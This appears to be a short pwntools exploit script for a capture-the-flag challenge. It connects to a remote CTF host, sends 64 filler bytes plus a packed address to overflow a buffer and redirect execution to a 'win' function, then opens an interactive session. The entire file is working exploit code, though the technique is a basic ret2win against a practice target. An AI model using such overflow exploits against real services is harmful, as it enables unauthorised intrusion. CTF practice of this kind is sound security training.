#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64")

HOST = "dju-ctf.com"
PORT = 9008
WIN = 0x401290
OFFSET = 64

io = remote(HOST, PORT)
io.recvuntil(b"hello")
io.sendline(b"A" * OFFSET + p64(WIN))
io.interactive()

